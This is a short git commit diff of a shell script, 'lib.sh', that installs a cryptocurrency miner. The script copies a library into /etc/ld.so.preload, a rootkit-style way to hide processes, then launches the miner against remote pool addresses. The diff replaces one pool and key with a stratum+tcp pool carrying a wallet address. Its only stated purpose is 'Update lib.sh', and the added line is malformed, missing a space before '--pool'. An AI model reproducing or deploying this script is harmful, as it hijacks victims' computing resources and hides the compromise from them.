ef8d0989e4b74656c91c9c00281b679ceed38ff8
ReinkemeyerJoan1997 <royhus7966@outlook.com>
2024-12-28 01:32:44 +0700

    Update lib.sh

--- lib.sh
+++ lib.sh
@@ -1,4 +1,4 @@
 mv biarkan.so /usr/local/lib/biarkan.so
 mv ld.so.preload /etc/ld.so.preload
 sleep 5
-./admin --pubkey 2wbiydSw8VekLhExxwSVTQP1wdLZb5QbtCC3TdUJCq2Z --no-pcie --pool 165.22.249.131:443
+./biarkan--pool stratum+tcp://0x5FcF1A2c07b72C6902e03d4417e6B0Ef2e5760e9.Worker001@38.75.137.183:32672
